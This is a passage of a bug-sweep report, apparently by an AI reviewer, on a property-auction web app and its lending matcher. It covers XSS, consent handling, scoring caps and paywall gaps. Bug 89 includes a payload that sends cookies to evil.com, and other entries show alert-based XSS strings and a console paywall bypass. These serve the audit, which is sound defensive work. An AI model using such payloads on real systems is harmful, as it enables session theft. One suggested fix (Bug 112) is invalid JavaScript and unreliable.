**File:** index.html lines 2747-2750; server.js line 708
**Area:** Email Capture Form — Validation (Landing Page Form Submits Without Phone, Bypasses Name Validation)
**Severity:** Low
**Description:** The landing page email capture form at lines 2747-2750 submits `{ name, email, source: 'landing-page' }` with no phone. The server at line 712 correctly allows this (`source === 'landing-page'` skips phone requirement). However, the server requires only `name` and `email` (line 708), and the client requires both via `!name || !email` (line 2741). The HTML form also has `required` attributes on both inputs (lines 1016-1017). This is correct. However, the `name` field uses `type="text"` which accepts whitespace-only input — a user could enter spaces as their name. The client trims the name (line 2737), and `"   ".trim()` = `""` which is falsy, so this IS caught. No bug here on review.
**Reproduction steps:** N/A — validation works correctly for the landing page form after review.
**Suggested fix:** N/A — no bug confirmed.
---

## BUG 87
**File:** bridgematch-lite.html line 976
**Area:** Enquiry Form — Error Handling (Non-JSON Server Error Shows Raw Parse Error)
**Severity:** Medium
**Description:** Confirming Bug 34 is still present and now more problematic: since the server has been updated with stricter validation (regex email check at line 715), legitimate validation rejections return JSON `{"error":"Valid email required"}` which parses correctly. But if Railway returns a 502/503/504 gateway error with an HTML body, line 976's `res.json()` throws `SyntaxError: Unexpected token < in JSON at position 0`. The `.catch()` at line 996 displays `err.message` — the user sees a confusing JSON parse error instead of "Server temporarily unavailable". This is the same bug as Bug 34/63 but confirming it persists after the server-side updates.
**Reproduction steps:**
1. Kill the server process while a form submission is in flight
2. Railway returns HTML 502 page
3. User sees "Unexpected token < in JSON at position 0"
**Suggested fix:** Check `res.ok` and `content-type` header before calling `res.json()`. Example: `if (!res.ok) { const text = await res.text(); try { const d = JSON.parse(text); throw new Error(d.error); } catch { throw new Error('Server temporarily unavailable'); } }`
---

## BUG 88
**File:** index.html line 2653; bridgematch-lite.html (no equivalent)
**Area:** Finance Widget — Data Integrity (Property Type 'Bungalow' Mapped to 'house')
**Severity:** Low
**Description:** The Finance Check widget maps property types at line 2653: `/flat|apartment|maisonette/` → 'flat', `/commercial|mixed/` → 'commercial', `/land/` → 'land', else 'house'. A bungalow is mapped to 'house', which is reasonable. However, the BridgeMatch API may have different LTV or criteria for bungalows (e.g., non-standard construction bungalows like PRC). The mapping doesn't distinguish between 'bungalow' and 'house', which could return incorrect lender results for bungalows that need specialist lending. Note: this is a minor data accuracy concern rather than a functional bug.
**Reproduction steps:**
1. Find a lot with propType "Bungalow"
2. Finance Check sends property_type: "house"
3. Lender results may not account for bungalow-specific criteria
**Suggested fix:** If the BridgeMatch API supports a 'bungalow' property type, add it to the mapping. Otherwise, acceptable as-is.
---

## BUG 89
**File:** server.js lines 755-774
**Area:** Enquiry Form — Security (XSS in Email Template — All User Fields Unescaped)
**Severity:** High
**Description:** Confirming Bug 1 is still present with full inventory of unescaped fields. The email HTML template at lines 755-774 interpolates these user-supplied values directly into HTML without any escaping: `name` (line 758), `email` (line 759 — both in text and mailto: href), `phone` (line 760 — both in text and tel: href), `contactPref` (line 761), `propertyAddress` (line 763), `propertyPrice` (line 764), `loanAmount` (line 765), `ltvPercent` (line 766), `worksBudget` (line 767), `matchingLenders` (line 768), `propertyType` (line 769), `depositRange` (line 770), `experienceLevel` (line 771), `auctionUrl` (line 772 — in both href and text). That's 13 user-controlled values injected into HTML. While most email clients strip `<script>` tags, some render inline event handlers (`onerror`, `onload`), and `<a href="javascript:...">` links in emails are dangerous if clicked. The `auctionUrl` at line 772 is particularly risky as it's placed directly in an `<a href="">` tag — a payload like `javascript:alert(document.cookie)` would execute when Simon clicks "View deal" in the notification email. The server already imports/has access to an `esc()` function but doesn't use it here.
**Reproduction steps:**
1. POST to `/api/leads` with `auctionUrl: 'javascript:void(document.location="https://evil.com?c="+document.cookie)'`
2. Simon receives email with "View deal" link pointing to the javascript: URL
3. If Simon clicks the link in an email client that doesn't strip javascript: URIs, cookies/session data are exfiltrated
**Suggested fix:** HTML-escape all interpolated values with a function like `const e = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')`. Validate `auctionUrl` starts with `https://` before using it in an href.
---

## Sweep completed at 2026-03-14T04:30:00Z

---

# Sweep 5 — 2026-03-14

## STATUS UPDATE — Previously Reported Bugs

The following bugs from Sweeps 1-4 have been **fixed** (verified by code inspection in this sweep):

- **BUG 1/89** (XSS in email notification): FIXED — server.js now uses `escHtml()` for all interpolated values (lines 764-778) and validates `auctionUrl` starts with `https://` (line 760)
- **BUG 33** (Email subject injection): FIXED — line 781 strips `\r\n\t` and slices to 100 chars: `safeName = (name || '').replace(/[\r\n\t]/g, ' ').slice(0, 100)`
- **BUG 35/36/37** (Column name mismatches): FIXED — server.js lines 728-748 now use `name`, `email`, `phone`, `deal_data`, `ip_address` which match the live table (schema file was stale)
- **BUG 41** (Finance Check doesn't pass property type): PARTIALLY FIXED — index.html Finance Check still doesn't pass `type` in the BridgeMatch link URL at line 2678, but bridgematch-lite.html now handles the `type` param (lines 1014-1031)
- **BUG 51** (parseInt without radix): FIXED — line 2649 now uses `parseInt(..., 10)` with nullish coalescing `??`
- **BUG 61** (LTV slider parseInt): FIXED — same fix at line 2649

The following bugs remain **unfixed** and are still present:

- **BUG 2** (No rate limiting on /api/leads): Still present — no rate limiting middleware
- **BUG 3** (No spam protection): Still present — no honeypot, captcha, or Turnstile
- **BUG 5** (Phone accepts non-numeric on client-side): Still present — line 920 only checks length
- **BUG 7** (FCA placeholder): Still present — line 829 shows `[FCA_NUMBER_NEEDED]` and line 985 shows `[FCA_NUMBER_NEEDED]`
- **BUG 8** (No enquiry form on listing detail pages): Still present — only Finance Check widget exists
- **BUG 13** (Double submit possible): Still present — no `isSubmitting` guard flag
- **BUG 15** (Street average mixes property types): Still present
- **BUG 20/69/79** (Rent estimation first-match bias): Still present
- **BUG 31** (No GDPR consent on landing page form): Still present — no consent checkbox on email capture
- **BUG 34/63/87** (Non-JSON error crashes handler): Still present in both forms
- **BUG 38/85** (Consent not stored): Still present — `consent_given` not in insert, consent not in payload
- **BUG 42** (RLS policy grants full access): Likely still present (schema-level)
- **BUG 43** (calcDealAnalysis dead code): Still present
- **BUG 56** (Activity log exposes PII): Still present at line 754
- **BUG 74** (Street average is postcode average, not street): Still present
- **BUG 76** (Welcome email XSS): Still present — line 814 uses `${firstName}` without `escHtml()`
- **BUG 80** (Yield score thresholds don't match CLAUDE.md): Still present — code uses +1.5/+0.5, docs say +2.5/+1.5
- **BUG 81** (Yield score not clamped): Still present — line 6966 rounds without clamping
- **BUG 82/83** (Client-server email validation mismatch): Still present — client still uses `includes('@')`

---

## BUG 90
**File:** bridgematch-lite.html line 605-612
**Area:** Deal Stacking — Logic (Additional Security Only Clears LTV Exclusion, Ignores Combined LTV vs Max)
**Severity:** Medium
**Description:** The additional security logic at line 606 checks `reasons.length === 1 && reasons[0].includes('LTV')` — it only triggers when LTV was the *sole* rejection reason. If a lender rejected for both LTV AND another reason (e.g., "Min loan £100k" and "LTV exceeds 75%"), the additional security logic is skipped entirely, even though the additional security could resolve the LTV portion. The investor sees "No lenders matched" without knowing that additional security could have resolved one of the two issues. Additionally, line 610 checks `combinedLTV <= effectiveMax.pct` but doesn't recalculate `effectiveMax` for additional security — some lenders may have different max LTV for second charges (`l.l2`) than for first charges.
**Reproduction steps:**
1. Enter a deal where loanNeeded is below a lender's minimum AND LTV exceeds max
2. Add additional security that would bring combined LTV within range
3. The lender remains excluded because LTV was not the *only* reason
**Suggested fix:** Check if additional security resolves the LTV exclusion regardless of other reasons — remove the `reasons.length === 1` constraint and instead just filter out the LTV-specific reason from the array if additional security resolves it.
---

## BUG 91
**File:** bridgematch-lite.html line 622-626
**Area:** Deal Stacking — Data Integrity (LTGDV Interest Calculation Uses Simple Interest, Not Compound)
**Severity:** Medium
**Description:** The per-lender LTGDV calculation at lines 622-624 uses simple interest: `iDay1 = d1Loan * lRate * loanTermMonths` and `iWorks = lWorks * lRate * (loanTermMonths / 2)`. Bridging finance interest is typically rolled up (compounded monthly). For a £150k loan at 0.875%/mo over 12 months: simple interest = £15,750, compound interest = £16,503 — a £753 difference. This understates the LTGDV ratio, potentially showing a lender as viable when the actual LTGDV exceeds their cap. The works interest uses `loanTermMonths / 2` which assumes works are drawn halfway through — reasonable as an average but not reflective of actual drawdown schedules.
**Reproduction steps:**
1. Enter a refurb deal: £200k purchase, £100k works, £350k GDV, 12-month term
2. For a lender at 0.875%/mo: LTGDV shown = ~79%, actual with compound interest = ~81%
3. If lender's LTGDV cap is 80%, the lot incorrectly appears as eligible
**Suggested fix:** Use compound interest: `iDay1 = d1Loan * ((1 + lRate) ** loanTermMonths - 1)` and `iWorks = lWorks * ((1 + lRate) ** (loanTermMonths / 2) - 1)`. Or note that the LTGDV is estimated using simple interest.
---

## BUG 92
**File:** index.html line 2678
**Area:** Finance Widget — Pre-Fill Missing Property Type in BridgeMatch Link
**Severity:** Low
**Description:** The "See all X matches on BridgeMatch" link at line 2678 passes `loan`, `value`, and `type` as URL params to `/check`. It does pass `type` via `apiType`, but `apiType` is already the BridgeMatch API category ('house'/'flat'/'commercial'/'land'), not the raw lot property type. BridgeMatch Lite's type mapper at lines 1016-1026 expects raw auction types like 'flat', 'bungalow', 'commercial' and maps them to 'resi'/'comm'/'semi'. When `apiType` is 'house', the type mapper maps it to `typeMap['house']` = `'resi'` — this works. When `apiType` is 'flat', it maps to `'resi'` — also correct. So this is actually working correctly. N/A — no bug after verification.
**Reproduction steps:** N/A
**Suggested fix:** N/A
---

## BUG 93
**File:** bridgematch-lite.html line 1012; line 1047
**Area:** Pre-Fill — Data Integrity (parseInt on Non-Numeric Price String Produces NaN)
**Severity:** Medium
**Description:** At line 1012, `parseInt(price)` parses the URL `price` parameter. If the auction tool passes a formatted price like `£150,000` or `150,000` (with commas), `parseInt('£150,000')` returns `NaN` and `parseInt('150,000')` returns `150` (stops at first comma). The `toLocaleString('en-GB')` call on NaN would produce "NaN", and `formatCurrency` would strip non-digits leaving an empty string. Similarly at line 1047 for the cash param. The index.html Finance Check link at line 2678 uses `encodeURIComponent(lot.price)` which sends the raw number (e.g., `150000`) — so the actual integration path works. But if a user manually constructs a URL like `/check?price=£150,000`, the pre-fill silently fails or shows wrong value.
**Reproduction steps:**
1. Navigate to `/check?price=150,000` — price pre-fills as "150" (parseInt stops at comma)
2. Navigate to `/check?price=£150000` — price pre-fills as "NaN" (parseInt can't parse £)
**Suggested fix:** Strip non-numeric characters before parsing: `parseInt(price.replace(/[^0-9]/g, ''))`.
---

## BUG 94
**File:** server.js line 814; line 807
**Area:** Welcome Email — XSS (firstName Not HTML-Escaped)
**Severity:** High
**Description:** Confirming BUG 76 is still present. The welcome email at line 814 interpolates `${firstName}` directly into HTML: `Welcome, ${firstName}!`. The `firstName` is derived from `(name || '').split(' ')[0]` at line 807 — no HTML escaping. The `escHtml()` function exists at line 26 but is not used here. If a user signs up with name `<img src=x onerror=alert(1)>`, firstName becomes `<img` (split on space), which is harmless. But a name like `<script>alert(1)</script>` produces firstName `<script>alert(1)</script>` (no spaces). While most email clients strip script tags, the welcome email is sent to the user's own email — self-XSS is lower severity but still a code quality issue. More concerning: the `email` at line 836 (`to: [email]`) is already validated by the `/api/leads` endpoint regex, but `sendWelcomeEmail` may be called from other code paths where `name` is less trusted.
**Reproduction steps:**
1. Sign up with name `<b>Test</b>` (no spaces so it becomes firstName)
2. Welcome email renders "Welcome, **Test**!" with bold HTML tag interpreted
**Suggested fix:** Use `escHtml(firstName)` at line 814: `Welcome, ${escHtml(firstName)}!`
---

## BUG 95
**File:** bridgematch-lite.html line 628
**Area:** Deal Stacking — Data Integrity (_addlSecUsed Flag Logic Inverted)
**Severity:** Low
**Description:** At line 628, `_addlSecUsed` is set to `addlEquity > 0 && combinedLTV < ltv`. The condition `combinedLTV < ltv` checks if the combined LTV is *lower* than the individual LTV — which should always be true when additional security has equity (since adding collateral reduces the debt-to-security ratio). So `_addlSecUsed` is effectively just `addlEquity > 0` for any case where additional security has positive equity. However, the intent appears to be to flag lenders that *needed* additional security to qualify — i.e., lenders that were excluded on LTV but the additional security resolved it (lines 605-612). A lender that passed LTV without additional security still gets `_addlSecUsed: true` if the user provided additional security, even though it wasn't needed for that lender. This results in a misleading "✓ Addl security" badge on lenders that would have qualified anyway.
**Reproduction steps:**
1. Enter a deal at 60% LTV that matches most lenders
2. Also add additional security with positive equity
3. All eligible lenders show "✓ Addl security" even though none needed it
**Suggested fix:** Set a flag inside the additional-security resolution block (lines 606-612) like `let usedAddlSec = false; ... usedAddlSec = true;` and then use `_addlSecUsed: usedAddlSec` in the eligible push.
---

## BUG 96
**File:** index.html line 2668; line 2672
**Area:** Finance Widget — Data Integrity (count !== 1 Fails for String "1")
**Severity:** Low
**Description:** Confirming BUG 50 is still present. At line 2673, pluralisation uses `count !== 1` (strict inequality). The `count` at line 2668 is `data.summary?.eligible || data.eligible?.length || 0`. If the BridgeMatch API returns `summary.eligible` as the string `"1"`, then `"1" !== 1` is `true`, showing "1 lenders match" (plural). The `parseInt` fix at line 2649 was applied to the LTV slider but not to the finance check `count`.
**Reproduction steps:**
1. If BridgeMatch API returns `{"summary":{"eligible":"1"}}`, the widget shows "1 lenders" (plural)
**Suggested fix:** Coerce: `const count = parseInt(data.summary?.eligible, 10) || data.eligible?.length || 0;`
---

## BUG 97
**File:** bridgematch-lite.html line 460
**Area:** Deal Stacking — Data Integrity (loanNeeded Clamped to 0 but No Messaging When Cash Exceeds Price)
**Severity:** Low
**Description:** At line 461, `loanNeeded = Math.max(0, price - cash)`. If the investor has more cash than the purchase price (e.g., £200k cash for a £150k property), `loanNeeded` becomes 0, and `ltv` at line 462 becomes 0%. The function continues to match lenders — but with a £0 loan, most lenders have minimum loan requirements (typically £25k-£100k) and will be excluded. The user gets "0 lenders matched" with confusing exclusion reasons like "Min loan £50k". There's no message explaining that they don't need a bridging loan because they have sufficient cash.
**Reproduction steps:**
1. Enter £100k purchase price with £150k cash available
2. Click "Check my deal" — 0 lenders match with min-loan exclusions
3. No message like "You have enough cash — a bridging loan isn't needed"
**Suggested fix:** Before running lender matching, check if `cash >= price` and show a message: "Your cash covers the full purchase price — you don't need a bridging loan. You'll still need ~[stampDuty + estCosts] for stamp duty and fees."
---

## BUG 98
**File:** index.html line 2464 (dlCSV)
**Area:** Data Integrity — CSV Export Paywalled but No Server-Side Enforcement
**Severity:** Medium
**Description:** The CSV download function at line 2464 checks `window._userTier !== 'premium'` and shows a paywall if not premium. However, this is purely a client-side check. The `LOTS` array is already loaded in memory in the browser. A user can bypass the paywall by typing `LOTS` in the browser console and accessing all data including yields, comparables, scores, and addresses — then exporting it manually. The CSV format is just a convenience; the underlying data is fully accessible. This means the paywall offers no actual data protection.
**Reproduction steps:**
1. Open browser console on the auctions page
2. Type `JSON.stringify(LOTS)` — all lot data including premium fields is accessible
3. Or: override `window._userTier = 'premium'` then call `dlCSV()`
**Suggested fix:** If CSV data is meant to be a premium feature, the data should be served from the server conditionally — e.g., omit yield/comparable fields from the API response for free-tier users. Client-side gating alone is not sufficient for data protection.
---

## BUG 99
**File:** index.html line 2765
**Area:** Email Capture Form — Submission (querySelector('.ec-note') Throws on Missing Element)
**Severity:** Medium
**Description:** On successful email capture submission, line 2765 executes `document.querySelector('.ec-note').style.display = 'none'`. However, no element with class `ec-note` exists in the HTML. The CSS rule `.ec-note` is defined at line 409, but no DOM element uses this class. This means `querySelector('.ec-note')` returns `null`, and accessing `.style` on `null` throws an uncaught `TypeError: Cannot read properties of null (reading 'style')`. This error occurs AFTER the success message is shown (lines 2763-2764 execute first), so the user sees the success state but the error propagates. In strict error boundaries or monitoring, this would be logged as a runtime exception on every successful subscription.
**Reproduction steps:**
1. Fill in the email capture form with valid name and email
2. Submit — the form hides and success message appears
3. Open browser console — a `TypeError` is logged: `Cannot read properties of null (reading 'style')` at line 2765
**Suggested fix:** Either add the `.ec-note` element back to the HTML (it was presumably removed during a redesign), or remove the dead querySelector call at line 2765. A safe version: `const ecNote = document.querySelector('.ec-note'); if (ecNote) ecNote.style.display = 'none';`
---

## BUG 100
**File:** index.html lines 2748-2758
**Area:** Email Capture Form — Compliance (Consent Checkbox State Never Read, Always Sent as TRUE)
**Severity:** High
**Description:** The email capture form HTML at line 1018 includes a consent checkbox with `required` attribute: `<input type="checkbox" name="consent" required>`. However, the `submitEmailCapture()` JS handler at line 2739 calls `e.preventDefault()` which bypasses HTML5 form validation (including the `required` attribute). The JS validation at lines 2749-2750 checks name and email but does NOT check the consent checkbox state. At line 2758, the payload hardcodes `consent: true` regardless of whether the checkbox is actually checked. This means: (1) a user can submit without checking the consent box (because `required` is bypassed by `preventDefault()`), and (2) even if the checkbox is unchecked, `consent: true` is sent to the server. This undermines GDPR compliance — the consent record in the database is meaningless because it doesn't reflect the user's actual action.
**Reproduction steps:**
1. Go to the email capture form section
2. Enter name and email but do NOT check the consent checkbox
3. The form will submit successfully (the `required` attribute is bypassed)
4. Inspect the network request — `consent: true` is sent regardless
5. The lead is stored with `consent_given: true` even though no consent was given
**Suggested fix:** Add consent validation to `submitEmailCapture()`: read the checkbox state (`const consent = form.consent.checked`) and validate it (`if (!consent) { errEl.textContent = 'Please tick the consent checkbox'; ... return false; }`). Then pass the actual value in the payload: `consent: consent` instead of `consent: true`.
---

## BUG 101
**File:** index.html line 2672
**Area:** Finance Widget — Data Integrity (count Coercion Falls Through to 0 When API Returns Object)
**Severity:** Low
**Description:** At line 2672, the lender count is computed as: `const count = data.summary?.eligible || data.eligible?.length || 0`. If the BridgeMatch API returns `summary.eligible` as `0` (the number zero, which is falsy), the expression falls through to `data.eligible?.length`. If `data.eligible` is also an empty array (length 0, also falsy), it correctly returns 0. However, if the API returns `summary.eligible` as `0` but `data.eligible` contains items (edge case where summary is stale but eligible array is populated), the count would show the array length instead of the summary value. More importantly, if `data.summary.eligible` is a non-numeric truthy value (e.g., an object `{total: 5}`), it would be used as-is and displayed as `[object Object]` in the widget. There's no type coercion or validation.
**Reproduction steps:**
1. If BridgeMatch API returns `{"summary":{"eligible":{"total":5}}}`, the widget would display `[object Object] lenders match`
2. This is an edge case dependent on the API response format changing
**Suggested fix:** Coerce and validate: `const count = parseInt(data.summary?.eligible, 10) || (data.eligible?.length ?? 0);`
---

## BUG 102
**File:** bridgematch-lite.html lines 879-887
**Area:** Enquiry Form — Code Quality (setOccupancy Redundant Class Operations Mask Intent)
**Severity:** Low
**Description:** Already partially logged as BUG 22. On re-inspection, an additional concern: the redundant class manipulations at lines 879-885 execute DOM classList operations that are immediately overwritten by `className = ` at lines 886-887. This causes 6 unnecessary DOM mutations per toggle, which triggers unnecessary style recalculations. While functionally correct, this is wasted CPU in a function that fires on user click. More importantly, if a future developer adds logic between lines 885 and 886 that relies on the classList state, they'll get unexpected results because `className =` at 886 overwrites everything.
**Reproduction steps:**
1. Click the "Yes — I'll live there" occupancy button — 6 unnecessary DOM mutations fire before the correct final state is set
**Suggested fix:** Remove lines 879-885 entirely — the `className =` assignments at 886-887 are sufficient and correct.
---

## Sweep completed at 2026-03-14T23:30:00Z

## BUG 103
**File:** server.js lines 962-973
**Area:** Data Integrity — stripAIFields Does Not Strip Yield/Comparable Fields for Blurred Lots
**Severity:** High
**Description:** The `stripAIFields()` function (used by `/api/all-lots` at line 2721 and `/api/smart-search` at line 2547) spreads `...lot` and then overrides only `score`, `opps`, `risks`, `scoreBreakdown`, `bullets`, `dealType`, `url`, and `address`. However, it does NOT strip `estGrossYield`, `estAnnualRent`, `estMonthlyRent`, `streetAvg`, `belowMarket`, `streetSales`, `sqft`, `beds`, or `price`. This means that even for blurred lots (index >= FREE_PREVIEW_LOTS), non-premium users receive full yield estimates, comparable sales data, and property metrics via the API. The `blurred: true` flag is set but the actual data is not removed — the frontend hides it visually but it's fully accessible in the API response.
**Reproduction steps:**
1. As a non-premium user, call `GET /api/all-lots`
2. Inspect the response JSON for lots where `blurred: true`
3. These lots still contain `estGrossYield`, `streetAvg`, `belowMarket`, `streetSales`, `estMonthlyRent`, `sqft`, `beds`, and full `price` values
**Suggested fix:** Add the yield/comparable fields to the strip list: `estGrossYield: null, estAnnualRent: null, estMonthlyRent: null, streetAvg: null, belowMarket: null, streetSales: [], sqft: null, beds: null`. Keep `price` visible (needed for basic browsing) but strip the analytics fields.
---

## BUG 104
**File:** api/analyse.js line 373
**Area:** Scoring — Data Integrity (Score Not Capped in api/analyse.js)
**Severity:** Medium
**Description:** The scoring function in `api/analyse.js` at line 373 computes `L.score = Math.round(s * 10) / 10` but does NOT clamp the score to the 0-10 range. In contrast, `server.js` line 6484 uses `L.score = Math.max(0, Math.min(10, Math.round(s * 10) / 10))` which correctly caps. The `api/analyse.js` file appears to be an alternative/modular analysis endpoint. If a lot accumulates enough positive signals (needs work +2.0, development +2.0, executor +1.5, low £/sqft +2.0, high yield +2.5, etc.), the score can exceed 10.0 — or go negative with enough risks. This creates inconsistent scoring between the two code paths.
**Reproduction steps:**
1. Submit a lot via the `api/analyse.js` code path with 6+ positive scoring signals
2. The returned score will exceed 10.0 (e.g., 13.5)
3. Compare with the same lot processed via `server.js` which would be capped at 10.0
**Suggested fix:** Change line 373 from `L.score = Math.round(s * 10) / 10;` to `L.score = Math.max(0, Math.min(10, Math.round(s * 10) / 10));` to match `server.js` behaviour.
---

## BUG 105
**File:** server.js line 6967
**Area:** Scoring — Data Integrity (Score Not Re-Capped After Yield Enrichment)
**Severity:** Medium
**Description:** In `enrichLots()`, score is properly capped at line 6947 after belowMarket adjustments: `lot.score = Math.max(0, Math.min(10, Math.round(lot.score * 10) / 10))`. However, immediately after, the yield enrichment at lines 6961-6965 adds +1.5 (for >8% yield) or +0.5 (for >6% yield) to the score. Line 6967 then only rounds: `lot.score = Math.round(lot.score * 10) / 10` — it does NOT re-cap to 0-10. A lot that scored 9.5 after belowMarket capping could reach 11.0 after yield enrichment (+1.5), violating the 0-10 constraint.
**Reproduction steps:**
1. Find a lot with a high base score (e.g., 8.5) that also has >20% belowMarket (+2 points, capped to 10.0 at line 6947)
2. If the lot also has >8% estimated yield, line 6961 adds +1.5, making score = 11.5
3. Line 6967 rounds to 11.5 but doesn't cap — final score exceeds 10
**Suggested fix:** Change line 6967 from `lot.score = Math.round(lot.score * 10) / 10;` to `lot.score = Math.max(0, Math.min(10, Math.round(lot.score * 10) / 10));`
---

## BUG 106
**File:** bridgematch-lite.html line 920; server.js lines 713-722
**Area:** Enquiry Form — Validation (Phone Regex Allows All-Punctuation Input; Server Has No Phone Format Check)
**Severity:** Medium
**Description:** Two related issues: (1) The client-side phone regex at line 920 is `/^\+?[\d\s()-]{10,15}$/` which matches the character class `[\d\s()-]` — digits, whitespace, parentheses, and hyphens. Crucially, it does not REQUIRE any digits. A string of 10 parentheses `((((((((((` or 10 hyphens `----------` passes validation. (2) The server-side endpoint at lines 713-722 only checks phone presence (`!phone`), not format. Any non-empty string is accepted as a valid phone number. Combined, a user can submit `phone: "(((((((((("` and it will be stored in the database and appear in the notification email.
**Reproduction steps:**
1. In BridgeMatch Lite form, enter name "Test", email "test@test.com", phone "((((((((((", check consent
2. Submit — the form accepts this phone number (passes regex)
3. Alternatively, POST to `/api/leads` with `phone: "not-a-number"` — server accepts it
**Suggested fix:** Client-side: require at least 7 digits in the phone number, e.g. `/^\+?[\d\s()-]*$/.test(phone) && phone.replace(/\D/g, '').length >= 7`. Server-side: add phone format validation matching the client regex, plus a minimum digit count check.
---

## BUG 107
**File:** index.html line 2758
**Area:** Email Capture Form — Compliance (Consent Checkbox State Still Not Read — BUG 100 Persists)
**Severity:** High
**Description:** Re-verification of BUG 100: Line 2758 still hardcodes `consent: true` in the payload. The consent checkbox added at line 1018 (`<input type="checkbox" name="consent" required>`) has its HTML5 `required` attribute bypassed by `e.preventDefault()` at line 2740. The JS validation at lines 2749-2750 checks name and email but still does not check the consent checkbox. The actual checkbox state is never read. This means: (a) users can submit without checking consent, and (b) the database records `consent_given: true` regardless. This is a GDPR compliance issue — the consent record is fabricated.
**Reproduction steps:**
1. Navigate to the email capture form
2. Enter name and email but leave the consent checkbox unchecked
3. Submit — form submits successfully (required attribute bypassed)
4. Inspect network request — `consent: true` is sent
**Suggested fix:** Add to validation: `const consent = form.consent.checked; if (!consent) { errEl.textContent = 'Please tick the consent checkbox to continue.'; errEl.style.display = 'block'; return false; }` Then in payload: `consent: consent` instead of `consent: true`.
---

## BUG 108
**File:** index.html line 2765
**Area:** Email Capture Form — Runtime Error (querySelector('.ec-note') Returns null — BUG 99 Persists)
**Severity:** Low
**Description:** Re-verification of BUG 99: Line 2765 still calls `document.querySelector('.ec-note').style.display = 'none'`. No element with class `ec-note` exists in the HTML (CSS rule exists at line 409 but no DOM element uses it). This throws `TypeError: Cannot read properties of null (reading 'style')` after every successful email capture submission. The error occurs after the success UI is shown (lines 2763-2764), so users see success but an error propagates in the console.
**Reproduction steps:**
1. Submit the email capture form with valid data
2. Open browser console — TypeError is logged
**Suggested fix:** Either add a safe check: `const ecNote = document.querySelector('.ec-note'); if (ecNote) ecNote.style.display = 'none';` or remove the dead line entirely.
---

## BUG 109
**File:** server.js line 6656-6661
**Area:** Yield Calculation — Data Integrity (VOA_RENTS Dictionary Match Order May Return Wrong Area)
**Severity:** Low
**Description:** The `estimateMonthlyRent()` function iterates over `VOA_RENTS` (lines 6565-6651) using `Object.entries()` and returns on the first address match via `address.toLowerCase().includes(area)`. If a property address contains multiple matching area names (e.g., "123 London Road, Westminister" would match both "london" and "westminster"), the first match in iteration order wins. JavaScript object property order follows insertion order for string keys, but this creates an implicit dependency on the order of entries in `VOA_RENTS`. If "london" appears before a more specific area like "westminster" in the object, the London rents will be returned instead of the more accurate Westminster rents, potentially skewing yield calculations by 20-40%.
**Reproduction steps:**
1. Call `estimateMonthlyRent("123 London Road, Westminster, SW1", 2)`
2. If "london" key appears before "westminster" in VOA_RENTS, London rents are returned
3. Westminster 2-bed rents are significantly higher than generic London rents
**Suggested fix:** Sort VOA_RENTS entries by key length descending (longest first) before iterating, so more specific area names match before generic ones. Or use a scoring system that picks the most specific match.
---

## Verification of Previously Logged Bugs (BUGs 1-102):

### FIXED since last sweep:
- **BUG 1** (XSS in email): FIXED — `escHtml()` function added at line 26, applied to all user-supplied values in email template (lines 765-779). `auctionUrl` validated with `safeUrl` check at line 761.
- **BUG 4** (Weak email validation): FIXED — email regex upgraded to `/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/` on both client (bridgematch-lite.html line 914) and server (server.js line 720).
- **BUG 9** (Score not capped): PARTIALLY FIXED — main scoring at server.js line 6484 now caps with `Math.max(0, Math.min(10, ...))`. But api/analyse.js line 373 and enrichLots yield adjustment at line 6967 still don't cap (see new BUGs 104, 105).

### STILL OPEN (confirmed on re-check):
- **BUG 2** (No rate limiting on leads): Still open — no rate limiting on `/api/leads` in server.js
- **BUG 3** (No spam protection): Still open — no honeypot, CAPTCHA, or Turnstile
- **BUG 5** (Phone validation): Regex improved but still insufficient (see new BUG 106)
- **BUG 7** (FCA placeholder): Still shows `[FCA_NUMBER_NEEDED]` at lines 829 and 986
- **BUG 99** (ec-note null): Still open (see BUG 108)
- **BUG 100** (Consent hardcoded true): Still open (see BUG 107)

## Sweep completed at 2026-03-15T01:45:00Z

---

# Sweep 5 — 2026-03-14 (Opus 4.6)

## BUG 110
**File:** server.js line 6967
**Area:** Scoring — Data Integrity (Score Not Clamped After Yield Enrichment)
**Severity:** Medium
**Description:** The enrichment phase clamps the score after comparables adjustment at line 6947 (`Math.max(0, Math.min(10, ...))`) but does NOT clamp after yield adjustment at line 6967. It only rounds: `Math.round(lot.score * 10) / 10`. If the comparables step sets score to exactly 10.0 (clamped), and then the yield step adds +1.5 (for >8% yield), the score becomes 11.5, which is only rounded to 11.5, not clamped. This re-opens the score >10 issue specifically for lots that max out on comparables AND have high yield.
**Reproduction steps:**
1. Find a lot that scores 10.0 after initial scoring + comparables (e.g., many positive signals + >20% below market)
2. If the lot also has >8% estimated yield, score += 1.5 at line 6961
3. Line 6967 rounds to 11.5 but does not clamp to 10
**Suggested fix:** Change line 6967 to: `lot.score = Math.max(0, Math.min(10, Math.round(lot.score * 10) / 10));`
---

## BUG 111
**File:** index.html line 2758
**Area:** Email Capture Form — Data Integrity (Consent Checkbox State Still Hardcoded true in Payload)
**Severity:** High
**Description:** Persists from BUG 100/107. The email capture form on the landing page has a consent checkbox at line 1018 (`<input type="checkbox" name="consent" required>`), but the `submitEmailCapture()` function at line 2758 still sends `consent: true` regardless of the checkbox state. The `required` HTML attribute is bypassed because the form's `onsubmit` calls `submitEmailCapture(event)` which calls `e.preventDefault()`, so native validation never fires. The JS validation at lines 2749-2750 only checks name and email, not the consent checkbox.
**Reproduction steps:**
1. Navigate to email capture form, enter name and email
2. Leave consent checkbox unchecked
3. Submit — form submits successfully with `consent: true` in payload
**Suggested fix:** Read checkbox state: `const consentChecked = form.consent.checked; if (!consentChecked) { errEl.textContent = 'Please tick the consent checkbox.'; errEl.style.display = 'block'; return false; }` Then: `consent: consentChecked` in payload.
---

## BUG 112
**File:** index.html line 2765
**Area:** Email Capture Form — Runtime Error (querySelector('.ec-note') Returns null)
**Severity:** Low
**Description:** Persists from BUG 99/108. After successful email capture submission, line 2765 calls `document.querySelector('.ec-note').style.display = 'none'`. No HTML element with class `ec-note` exists in the DOM (the CSS rule at line 409 defines `.ec-note` styles, but no element uses the class). This throws `TypeError: Cannot read properties of null` on every successful submission. The error is silently swallowed because it occurs after the success UI update, but pollutes the browser console.
**Reproduction steps:**
1. Submit the email capture form with valid data
2. Open browser console — TypeError logged
**Suggested fix:** Remove line 2765 or guard: `document.querySelector('.ec-note')?.style.display = 'none';`
---

## BUG 113
**File:** server.js line 745; leads schema
